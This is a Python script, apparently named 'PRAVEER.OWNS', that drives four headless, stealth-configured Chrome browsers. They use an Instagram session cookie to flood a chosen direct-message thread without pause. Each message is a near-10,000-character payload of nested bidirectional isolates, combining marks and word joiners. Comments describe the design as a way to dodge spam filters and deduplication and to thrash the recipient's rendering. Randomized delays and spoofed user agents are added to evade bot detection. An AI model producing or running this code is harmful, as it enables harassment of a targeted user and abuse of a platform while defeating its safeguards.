# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (SAFE-VELOCITY V74)
# 📅 STATUS: MULTI-AGENT-FLOOD | 4-AGENT TOTAL | ACCOUNT-PROTECT-ON

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- ⚡ HIGH-SPEED CONFIG ---
AGENTS_PER_MACHINE = 4             # Doubled agents for maximum screen coverage
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.2)          # 🔥 Ultra-fast burst
REST_AFTER_STRIKES = 300           # High endurance
REST_DURATION = 1                  # Minimal cooldown

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_rotating_nuclear_payload():
    """Generates a unique recursive payload every time to bypass spam filters."""
    u_id = random.randint(1000, 9999)
    # Rotating emoji/symbol headers to confuse detection algorithms
    heads = ["👑", "🌙", "⚔️", "🔥", "💎", "🦁"]
    lri, rli, pdi = "\u2066", "\u2067", "\u2069"
    marks = "".join([chr(i) for i in range(0x0300, 0x0330)]) 
    glue = "\u2060" 
    
    header = f"{random.choice(heads)} PRAVEER PAPA ON TOP {random.choice(heads)} [{u_id}]"
    
    body = []
    # 350 lines of recursive stack thrashing
    for i in range(350):
        # Nested isolates + Unique ID per line = Impossible to deduplicate
        nest = f"{lri}{rli}{lri}{rli}P{marks}R{marks}A{marks}V{marks}EER{pdi*4}"
        line = f"{nest} PAPA ON TOP {i}{glue*4}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--blink-settings=imagesEnabled=false") # 🛡️ Save YOUR CPU
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14{random.randint(0,9)}.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Zero-latency send that clears the cache to prevent 'Typing' hangs."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                box.dispatchEvent(new Event('input', { bubbles: true }));
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_rotating_nuclear_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Velocity-Strike ({GLOBAL_SENT})")
                    
                    # Refresh every 75 strikes to keep the browser memory clean
                    if strike_count % 75 == 0:
                        driver.refresh()
                        time.sleep(5)
                
                # Randomized delay to bypass "Botting" behavior patterns
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    # 🚀 Running 4 Parallel Agents for quad-velocity
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
